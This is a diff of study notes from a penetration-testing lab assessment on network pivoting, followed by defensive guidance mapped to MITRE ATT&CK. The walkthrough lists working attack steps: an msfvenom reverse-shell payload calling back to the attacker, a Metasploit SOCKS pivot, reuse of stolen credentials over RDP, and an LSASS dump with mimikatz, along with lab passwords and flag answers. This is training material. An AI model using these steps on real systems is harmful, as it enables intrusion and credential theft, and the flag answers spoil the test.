@@ -748,4 +748,195 @@ Thereon, students need to run the Proxifier executable as administrator:
 using the credentials jason:WellConnected123!:
 -Once successfully connected, students will find the flag H0pping@roundwithRDP! on the desktop:
 
--Skills Assessment
+-Skills Assessment\\\\\\\\\\\\\\\============================================================
+Pawned IP: 10.10.14.117
+target IP:10.129.107.213
+<test>"Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel
+ to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer."
+When changing directories to /home/ and listing its contents, students will find two directories /administrator/ and /webadmin/:
+cd /home/
+ls
+cd webadmin
+ls
+ls
+for-admin-eyes-only  -> mlefay:Plain Human work!
+id_rsa file id_rsa 
+
+<test>"Submit the credentials found in the user's home directory. (Format: user:password)"
+$cat for-admin-eyes-only
+ mlefay:Plain Human work!.
+
+<test>"Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer."
+Using the web shell from question 1 which is inside the webadmin directory, students need to use cat on the file id_rsa and save it inside a file within Pwnbox/PMVPN:
+cat id_rsa
+Subsequently, students need to change the permissions of the file to 600 using chmod:
+$chmod 600 id_rsa
+
+Then, students need to use the private key to connect to the spawned target machine over SSH, utilizing the same username webadmin:
+$ssh -i id_rsa webadmin@STMIP
+
+After connecting successfully and checking the network interfaces, students will notice that the machine is on the 172.16.5.0/16 network:
+ip a
+
+Therefore, students need to use a ping sweep to enumerate other hosts on the same network. Students will find that the other active host has the IP address 172.16.5.35.:
+$for i in {1..254};do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
+->172.16.5.35
+
+<Test>"Use the information you gathered to pivot to the discovered host. Submit the contents of C:\Flag.txt as the answer."
+First, students need to generate a Linux meterpreter payload to setup for pivoting through Metasploit:
+$msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.15.28 LPORT=9001 -f elf -o 99c0b43c4bec2bdc280741d8f3e40338.elf
+-Subsequently, students need to transfer the payload to the spawned target machine using scp, utilizing the private key that was attained previously:
+$scp -i id_rsa 99c0b43c4bec2bdc280741d8f3e40338.elf webadmin@STMIP:~/
+-Then, on Pwnbox/PMVPN, students need to run msfconsole and use the exploit/multi/handler module to catch the call-back from the spawned target machine:
+$ msfconsole -q
+>> use exploit/multi/handler
+-Students also need to set the module's options accordingly, most importantly setting LPORT to be the same port that was specified when generating the msfvenom payload (9001 in here):
+set LHOST 0.0.0.0
+set LPORT PWNPO
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+run
+
+-Then, if not connected to the spawned target over SSH, students need to do so:
+$ ssh -i id_rsa webadmin@10.129.88.197
+$chmod +x 99c0b43c4bec2bdc280741d8f3e40338.elf
+./99c0b43c4bec2bdc280741d8f3e40338.elf
+
+-Thereafter, students need to set up the auxiliary/server/socks_proxy module to configure a local proxy on Pwnbox/PMVPN. Still, first, students need to background the current Meterpreter session and then proceed to use and set the options of socks_proxy:
+bg
+use auxiliary/server/socks_proxy
+set SRVPORT 9050
+set VERSION 4a
+run
+
+-Once the SOCKS proxy server has started, students need to attach back to session 1 and then use autoroute to add routes to the 172.16.5.0/16 network:
+at$sessions -i 1
+at$run autoroute -s 172.16.5.0/16
+
+Once the route has been added from Pwnbox/PMVPN, students need to enumerate 172.15.5.25 using Nmap through proxychains:
+proxychains nmap 172.16.5.35 -Pn -sT
+
+-From the output of Nmap, students will notice that port 3389 on 172.16.5.35 is open;
+ therefore, they need to test for the "credentials reuse" security misconfiguration and see whether the
+  credentials mlefay:Plain Human work! will work by connecting with xfreerdp through proxychains:
+$proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!'
+type C:\Flag.txt
+
+<test>"In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?"
+$wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
+$unzip mimikatz_trunk.zip
+
+-Then, within the x64 folder, students need to copy and paste mimikatz.exe into 172.16.5.35 
+(with the credentials mlefay:Plain Human work!) utilizing the same xfreerdp session from the previous section:
+
+-Subsequently, students need to create a dump file of lsass.exe; first, they need to run Task Manager as administrator:
+-Then, once they find Local Security Authority Process, students need to right-click and select Create dump file:
+Students will be notified that the dump has been written to C:\Users\mlefay\AppData\Local\Temp\lsass.DMP:
+
+-Thereafter, students then need to launch mimikatz by double-clicking on its icon:
+-Students need to use the sekurlsa module with LogonPasswords to list all available provider credentials:
+$sekurlsa::minidump C:\Users\mlefay\AppData\Local\Temp\lsass.DMP
+C:\Users\mlefay\AppData\Local\Temp\lsass.DMP
+$sekurlsa::LogonPasswords
+-From the output of sekurlsa::LogonPasswords, students will find that the user vfrank is vulnerable, 
+as the user's password is exposed to be Imply wet Unmasked!
+
+<test>"For your next hop enumerate the networks and then utilize a common remote access solution to pivot. 
+Submit the C:\Flag.txt located on the workstation."
+PS$1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}
+The 172.16.6.25 host is alive; therefore, using the credentials vfrank:Imply wet Unmasked! attained in t
+he previous section, students need to connect to the host with RDP:
+Once connected successfully, students need to open CMD:
+At last, students need to print out the contents of the flag file "Flag.txt", which is under the C:\ directory, to attain N3tw0rk-H0pp1ng-f0R-FuN:
+type C:\Flag.txt
+
+<Test>"Submit the contents of C:\Flag.txt located on the Domain Controller."
+Using the same RDP connection to the 172.16.6.25 host, students need to open This PC and then double-click on the network share AutomateDCAdmin (Z:):
+Within it, students will find the flag file "Flag.txt", with its contents being 3nd-0xf-Th3-R@inbow!:
+
+\\\================================================
+Detection & Prevention
+As penetration testers, we should also be concerned with the mitigations and detections that can be put in place to aid defenders in stopping these types of TTP's. This is crucial since we are expected to provide our customers with potential fixes or solutions to the issues we find and exploit during our assessments. Some may be:
+
+Physical hardware changes
+Changes to the network infrastructure
+Modifications to host baselines
+
+\\Setting a Baseline
+-s defenders, we should be able to quickly identify and investigate any new hosts that appear in our network, any new tools or applications that get installed on hosts outside of our application catalog, and any new or unique network traffic generated.
+-An audit of everything listed below should be done annually, if not every few months, to ensure your records are up to date. Among some of the considerations we can start with are:
+\\Things to Document and Track
+DNS records, network device backups, and DHCP configurations
+Full and current application inventory
+A list of all enterprise hosts and their location
+Users who have elevated permissions
+A list of any dual-homed hosts (More than one network interface)
+Keeping a visual network diagram of your environment
+-, keeping a visual network diagram of your environment up-to-date can be highly effective when troubleshooting issues or responding to an incident.
+-https://www.netbraintech.com/
+-https://app.diagrams.net/
+
+\\People, Processes, and Technology
+-Network hardening can be organized into the categories People, Process, and Technology. These hardening measures will encompass the hardware, software, and human aspects of any network. Let's start with the human (People) aspect.
+-In even the most hardened environment, users are often considered the weakest link.
+- strive to keep ourselves and the users we serve educated and aware of threats
+-BYOD and Other Concerns
+\\Processes
+Maintaining and enforcing policies and procedures can significantly impact an organization's overall security posture. It is near impossible to hold an organization's employees accountable without defined policies. It makes it challenging to respond to an incident without defined and practiced procedures such as a disaster recovery plan. The items below can help to start defining an organization's processes, policies, and procedures relating to securing their users & network environment.
+
+Proper policies and procedures for asset monitoring and management
+Host audits, the use of asset tags, and periodic asset inventories can help ensure hosts are not lost
+Access control policies (user account provisioning/de-provisioning), multi-factor authentication mechanisms
+Processes for provisioning and decommissioning hosts (i.e., baseline security hardening guideline, gold images)
+Change management processes to formally document who did what and when they did it
+
+\\Technology
+-Periodically check the network for legacy misconfigurations and new & emerging threats. As changes are made to an environment, ensure that common misconfigurations are not introduced while paying attention to any vulnerabilities introduced by tools or applications utilized in the environment. If possible, attempt to patch or mitigate those risks with the understanding that the CIA triad is a balancing act, and the acceptance of the risk a vulnerability presents may be the best option for your environment.
+\\From the Outside Moving In
+-As penetration testers and security practitioners, we want our clients to take our findings and recommendations seriously enough to inform their decisions moving forward. 
+-We want them to understand that the issues we uncover can also be found by individuals or groups with less honorable intentions
+
+\\Perimeter First
+What exactly are we protecting?
+What are the most valuable assets the organization owns that need securing?
+What can be considered the perimeter of our network?
+What devices & services can be accessed from the Internet? (Public-facing)
+How can we detect & prevent when an attacker is attempting an attack?
+How can we make sure the right person &/or team receives alerts as soon as something isn't right?
+Who on our team is responsible for monitoring alerts and any actions our technical controls flag as potentially malicious?
+Do we have any external trusts with outside partners?
+What types of authentication mechanisms are we using?
+Do we require Out-of-Band (OOB) management for our infrastructure. If so, who has access permissions?
+Do we have a Disaster Recovery plan?
+\\
+External interface on a firewall
+Next-Gen Firewall Capabilities
+Blocking suspicious connections by IP
+Ensuring only approved individuals are connecting to VPNs
+Building the ability to quick disconnect suspicious connections without disrupting business functions
+\\Internal Considerations
+Are any hosts that require exposure to the internet properly hardened and placed in a DMZ network?
+Are we using Intrusion Detection and Prevention systems within our environment?
+How are our networks configured? Are different teams confined to their own network segments?
+Do we have separate networks for production and management networks?
+How are we tracking approved employees who have remote access to admin/management networks?
+How are we correlating the data we are receiving from our infrastructure defenses and end-points?
+Are we utilizing host-based IDS, IPS, and event logs?
+-Our best chance of spotting, stopping, and potentially even preventing an attack often depends on our ability to maintain visibility within our environment. A proper SIEM implementation to correlate and analyze our host and infrastructure logs can go a long way.
+
+\\MITRE Breakdown
+MITRE Breakdown
+As a different look at this, we have broken down the major actions we practice in this module and mapped controls based on the TTP and a MITRE tag. Each tag corresponds with a section of the Enterprise ATT&CK Matrix found here. Any tag marked as TA corresponds to an overarching tactic, while a tag marked as T### is a technique found in the matrix under tactics.
+
+TTP	MITRE Tag	Description
+External Remote Services	T1133	We have options for prevention when dealing with the use of External Remote Services. First, having a proper firewall in place to segment our environment from the rest of the Internet and control the flow of traffic is a must. Second, disabling and blocking any internal traffic protocols from reaching out to the world is always a good practice. Third, using a VPN or some other mechanism that requires a host to be logically located within the network before it gains access to those services is a great way to ensure you aren't leaking data you shouldn't.
+Remote Services	T1021	Multi-factor authentication can go a long way when trying to mitigate the unauthorized use of remote services such as SSH and RDP. Even if a user's password was taken, the attacker would still need a way to acquire the string from their MFA of choice. Limiting user accounts with remote access permissions and separating duties as to who can remotely access what portions of a network can go a long way. Utilizing your networked firewall and the built-in firewall on your hosts to limit incoming/outgoing connections for remote services is an easy win for defenders. It will stop the connection attempt unless it is from an authorized internal or external network. When dealing with infrastructure devices such as routers and switches, only exposing remote management services and ports to an Out Of Band (OOB) network is a best practice that should always be followed. Doing this ensures that anyone who may have compromised the enterprise networks cannot simply hop from a regular user's host into the infrastructure.
+Use of Non-Standard Ports	T1571	This technique can be a tricky one to catch. Attackers will often use a common protocol such as HTTP or HTTPS to communicate with your environment. It is hard to see what is going on, especially with the use of HTTPS, but the pairings of protocols such as these with a non-standard port ( 444 instead of 443, for example) can tip us off to something suspicious happening. Attackers will often try to work in this manner, so having a solid baseline of what ports/protocols are commonly used in your environment can go a long way when trying to spot the bad. Using some form of a Network Intrusion Prevention or Detection system can also help spot and shut down the potentially malicious traffic.
+Protocol Tunneling	T1572	This is an interesting problem to tackle. Many actors utilize protocol tunneling to hide their communications channels. Often we will see things much like we practiced in this module (tunneling other traffic through an SSH tunnel) and even the use of protocols like DNS to pass instructions from external sources to a host internal to the network. Taking the time to lock down what ports and protocols are allowed to talk in/out of your networks is a must. If you have a domain running and are hosting a DC & DNS server, your hosts should have no reason to reach externally for name resolution. Disallowing DNS resolution from the web (except to specific hosts like the DNS server) can help with an issue such as this. Having a good monitoring solution in place can also watch for traffic patterns and what is known as Beaconing. Even if the traffic is encrypted, we may possibly see requests happening in a pattern over time. This is a common trait of a C2 channel.
+Proxy Use	T1090	The use of a Proxy point is commonplace among threat actors. Many will use a proxy point or distribute their traffic over multiple hosts so that they do not directly expose their infrastructure. By using a proxy, there is no direct connection from the victim's environment to the attacker's host at any given time. The detection and prevention of proxy use is a bit difficult as it takes an intimate knowledge of common net flow within your environment. The most effective route is maintaining a list of allowed/blocked domains and IP addresses. Anything not explicitly allowed will be blocked until you let the traffic through.
+LOTL	N/A	It can be hard to spot an attacker while they are utilizing the resources on hand. This is where having a baseline of network traffic and user behavior comes in handy. If your defenders understand what the day-to-day normal for their network looks like, you have a chance to spot the abnormal. Watching for command shells and utilizing a properly configured EDR and AV solution will go a long way to providing you visibility. Having some form of networking monitoring and logging feeding into a common system like a SIEM which defenders check, will go a long way to seeing 
+Those actions could include:
+
+Utilizing tunnels and pivot points we set up to perform additional exploitation and lateral movement.
+Implanting persistence mechanisms in each subnet to ensure continued access.
+Command & Control inside and throughout enterprise environments.
+Utilizing our tunnels for security control bypass when bringing tools in and exfiltrating data.
